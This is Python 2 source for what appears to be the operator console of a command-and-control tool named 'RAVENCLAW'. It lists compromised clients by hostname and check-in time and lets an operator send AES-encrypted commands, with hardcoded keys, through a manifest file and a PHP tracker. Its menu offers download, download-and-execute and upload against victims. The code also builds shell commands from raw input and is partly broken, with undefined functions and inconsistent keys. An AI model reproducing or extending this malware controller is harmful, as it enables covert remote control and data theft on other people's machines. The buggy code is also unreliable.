import os
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random


class AESCipher:
   def __init__( self, key ):
      self.key = key
      self.salt = "CorrectHorseBatteryStaple"
      self.init = "Yet another key"

   def encrypt( self, raw ):
      word = map(ord, self.key) + map(ord, self.salt)
      word = "".join(map(chr, word))
      hash = hashlib.sha1(self.init).hexdigest()
      bray = map(ord, hash.upper())[0:15]
      hash = map(chr, bray)
      iv = "".join(hash)
      iv = iv[:-ord(iv[len(iv)-1:])]
      
      #iv = Random.new().read( AES.block_size )
      #init = "abcdefghijklmnopqrstuvwxyz"
      #iv = init[0:AES.block_size]
      #AES.block_size = 0x80
      iv = hashlib.sha1("test").hexdigest().upper()[0:16]
      key = hashlib.sha1("test").hexdigest().upper()[0:16]
      #raw = 'The answer is no'

      #Pad CMDs
      if len(raw) % 16 != 0:
         raw += ' ' * (16 - len(raw) %16)

      cipher = AES.new(key, AES.MODE_CBC, iv)
      return base64.b64encode(cipher.encrypt(raw))

   def decrypt( self, enc ):
      enc = base64.b64decode(enc)
      iv = enc[:16]
      cipher = AES.new(self.key, AES.MODE_CBC, iv )
      return unpad(cipher.decrypt( enc[16:] ))

class Flocking:
   def __init__( self, target):
      self.target = target

   def execute(cmd):
      cryptcmd = AESCipher("hacktheplanet").encrypt(cmd)
      phphead = cryptcmd + "\"<?php include 'track.php';?>\""
      os.system("echo " + phphead + " > cmd.php")

class Raven:
   #def __init__(self)
   #   self.

   def menu(self):
      print "\nRAVENCLAW Help Menu:\n"
      print "help, ?          - Display this help menu"
      print "sessions         - Display clients"
      print "interact         - Enter client interaction mode"
      
      print ""
      print "Client Interaction Commands: (Must enter interactive mode)\n"
      print "download         - Download file <download url>"
      print "dlx              - Download and execute <dlx url>"
      print "upload           - Upload spcified file via post <upload file>"
       
      print "\n"

   def list(self):
      print "Avaliable sessions:"
      dirlist = compute_dir_index("log/")
      print "HOSTNAME        -   LAST CHECKIN"

      for client in dirlist["subdirs"]:
         if len(client) % 16 != 0:
            client += ' ' * (16 - len(client) %16)        
         checklist = []
         for resp in dirlist["files"]:
            if client.rstrip(" ") in resp:
               checklist += "".join(resp.split("/")[1]) + ";"
               #print checklist, "".join(resp)

         lastcheck = "".join(checklist).split(";")#.sort()
         lastcheck.sort(reverse=True)
         try: 
            print client + "-   " + str(lastcheck[1])
         except:
            print client + "-"

   def interact(self):
      Raven().list()
      target = raw_input("target: ")
      prompt = "raven_" + str(target) + ">"
      while True:
         try:
            cmd = raw_input(prompt)
            if cmd == "?" or cmd == "help":
               Raven().list()
            elif cmd == "exit":
               print ""
               break
            cryptcmd = AESCipher("hacktheplanet").encrypt(cmd)
            phphead = "\"<?php include 'track.php';?>\""
            os.system("echo " + cryptcmd + " > log/" + str(target) + "/manifest.txt")
            os.system("echo " + phphead + " > cmd.php")
         except KeyboardInterrupt:
            print ""
            break

   def mod(self):
      print "Knighthawks"
   



def compute_dir_index(path):
    """ Return a tuple containing:
    - list of files (relative to path)
    - lisf of subdirs (relative to path)
    - a dict: filepath => last
    """
    files = []
    subdirs = []

    for root, dirs, filenames in os.walk(path):
        for subdir in dirs:
            subdirs.append(os.path.relpath(os.path.join(root, subdir), path))

        for f in filenames:
            files.append(os.path.relpath(os.path.join(root, f), path))

    index = {}
    for f in files:
        index[f] = os.path.getmtime(os.path.join(path, files[0]))

    return dict(files=files, subdirs=subdirs, index=index)


'''
while True:
   cmddict = {
      "help"      : Raven().menu,
      "?"         : Raven().menu,
      "sessions"  : Raven().list,
      "interact"  : Raven().interact,
      "mod"       : Raven().mod
   }

   cmd = raw_input("raven>")

   if cmd in cmddict:
      cmddict[cmd]()
   else:
      print "Command not found"
'''

